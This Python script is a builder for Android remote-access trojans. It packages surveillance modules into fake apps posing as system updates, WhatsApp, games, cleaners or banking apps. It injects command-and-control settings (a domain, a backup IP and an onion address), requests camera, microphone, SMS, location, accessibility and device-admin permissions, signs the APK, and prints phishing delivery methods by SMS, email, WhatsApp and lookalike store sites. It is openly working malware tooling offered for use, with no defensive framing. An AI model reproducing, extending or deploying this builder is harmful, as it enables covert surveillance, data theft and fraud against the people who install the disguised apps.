#!/usr/bin/env python3
"""
APK BUILDER - Generate custom RAT APKs with social engineering payloads
Auto-generates convincing fake apps for target delivery
"""

import os
import sys
import shutil
import subprocess
import json
from pathlib import Path

class UniverseRATBuilder:
    
    def __init__(self):
        self.base_dir = Path("/f/universe_rat_system")
        self.apk_builder_dir = self.base_dir / "apk_builder"
        self.template_dir = self.apk_builder_dir / "templates"
        self.output_dir = self.apk_builder_dir / "output"
        
    def build_apk(self, payload_type, target_app=None, c2_server="https://api.system-update-service.com"):
        """
        Build custom RAT APK
        
        Payload types:
        - system_update: Fake Android system update
        - whatsapp_clone: WhatsApp lookalike
        - game: Popular game clone
        - utility: Flashlight, cleaner, battery saver
        - banking: Fake banking app
        - custom: Custom app with specified icon/name
        """
        
        print(f"🔨 Building UNIVERSE-RAT APK")
        print(f"   Payload type: {payload_type}")
        print(f"   C2 Server: {c2_server}")
        
        # Select template
        if payload_type == "system_update":
            template = self.template_dir / "system_update"
            app_name = "System Update"
            package_name = "com.android.systemupdate"
            
        elif payload_type == "whatsapp_clone":
            template = self.template_dir / "whatsapp"
            app_name = "WhatsApp"
            package_name = "com.whatsapp.w4b"  # Slightly different package name
            
        elif payload_type == "game":
            template = self.template_dir / "game"
            app_name = target_app or "Candy Crush"
            package_name = "com.king.candycrushsaga.mod"
            
        elif payload_type == "utility":
            template = self.template_dir / "utility"
            app_name = "Super Cleaner Pro"
            package_name = "com.cleaner.boost.pro"
            
        elif payload_type == "banking":
            template = self.template_dir / "banking"
            app_name = target_app or "Mobile Banking"
            package_name = "com.bank.mobile.secure"
        
        # Copy template
        build_dir = self.apk_builder_dir / "build" / package_name
        if build_dir.exists():
            shutil.rmtree(build_dir)
        shutil.copytree(template, build_dir)
        
        # Inject C2 configuration
        self.inject_c2_config(build_dir, c2_server)
        
        # Inject all surveillance modules
        self.inject_modules(build_dir)
        
        # Modify AndroidManifest with all permissions
        self.inject_permissions(build_dir)
        
        # Build APK
        apk_path = self.compile_apk(build_dir, app_name, package_name)
        
        # Sign APK
        signed_apk = self.sign_apk(apk_path)
        
        print(f"✅ APK built successfully!")
        print(f"   Output: {signed_apk}")
        print(f"\n📱 DEPLOYMENT METHODS:")
        print(f"   1. SMS Phishing: 'Update your {app_name}: [link]'")
        print(f"   2. Email: 'Important security update required'")
        print(f"   3. WhatsApp: 'Check out this app: [link]'")
        print(f"   4. USB: Direct install when phone is accessible")
        print(f"   5. Play Store lookalike site")
        
        return signed_apk
    
    def inject_c2_config(self, build_dir, c2_server):
        """Inject C2 server configuration"""
        config_file = build_dir / "app/src/main/assets/config.json"
        config = {
            "c2_primary": c2_server,
            "c2_backup": "http://45.142.213.xxx:8443",
            "c2_onion": "http://dark7x8y9z.onion",
            "poll_interval": 60,
            "encryption_key": "UNIVERSE-RAT-2026-KEY"
        }
        
        with open(config_file, 'w') as f:
            json.dump(config, f)
    
    def inject_modules(self, build_dir):
        """Copy all surveillance modules into APK"""
        modules_src = self.base_dir / "modules"
        modules_dst = build_dir / "app/src/main/java/com/systemupdate/modules"
        
        shutil.copytree(modules_src, modules_dst, dirs_exist_ok=True)
    
    def inject_permissions(self, build_dir):
        """Add all required permissions to AndroidManifest.xml"""
        manifest_path = build_dir / "app/src/main/AndroidManifest.xml"
        
        permissions = """
    <!-- Camera & Microphone -->
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    
    <!-- Location -->
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
    
    <!-- Storage -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
    
    <!-- Contacts & Calendar -->
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
    <uses-permission android:name="android.permission.READ_CALENDAR" />
    
    <!-- SMS & Phone -->
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.CALL_PHONE" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
    
    <!-- Network -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
    
    <!-- System -->
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
    <uses-permission android:name="android.permission.GET_TASKS" />
    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
        """
        
        # Inject permissions into manifest
        with open(manifest_path, 'r') as f:
            manifest_content = f.read()
        
        manifest_content = manifest_content.replace('</manifest>', f'{permissions}\n</manifest>')
        
        with open(manifest_path, 'w') as f:
            f.write(manifest_content)
    
    def compile_apk(self, build_dir, app_name, package_name):
        """Compile APK using Gradle"""
        print("🔨 Compiling APK...")
        
        os.chdir(build_dir)
        subprocess.run(['./gradlew', 'assembleRelease'], check=True)
        
        apk_path = build_dir / "app/build/outputs/apk/release/app-release-unsigned.apk"
        output_path = self.output_dir / f"{package_name}.apk"
        
        shutil.copy(apk_path, output_path)
        return output_path
    
    def sign_apk(self, apk_path):
        """Sign APK with debug keystore"""
        print("✍️  Signing APK...")
        
        keystore = self.apk_builder_dir / "keystore/universe-rat.keystore"
        signed_apk = apk_path.with_suffix('.signed.apk')
        
        subprocess.run([
            'jarsigner', '-verbose',
            '-sigalg', 'SHA256withRSA',
            '-digestalg', 'SHA-256',
            '-keystore', str(keystore),
            '-storepass', 'universe2026',
            '-keypass', 'universe2026',
            apk_path,
            'universe-rat'
        ], check=True)
        
        # Zipalign
        subprocess.run([
            'zipalign', '-v', '4',
            apk_path,
            signed_apk
        ], check=True)
        
        return signed_apk

def main():
    if len(sys.argv) < 2:
        print("Usage: python apk_builder.py <payload_type> [target_app] [c2_server]")
        print("\nPayload types:")
        print("  - system_update")
        print("  - whatsapp_clone")
        print("  - game")
        print("  - utility")
        print("  - banking")
        sys.exit(1)
    
    payload_type = sys.argv[1]
    target_app = sys.argv[2] if len(sys.argv) > 2 else None
    c2_server = sys.argv[3] if len(sys.argv) > 3 else "https://api.system-update-service.com"
    
    builder = UniverseRATBuilder()
    builder.build_apk(payload_type, target_app, c2_server)

if __name__ == '__main__':
    main()
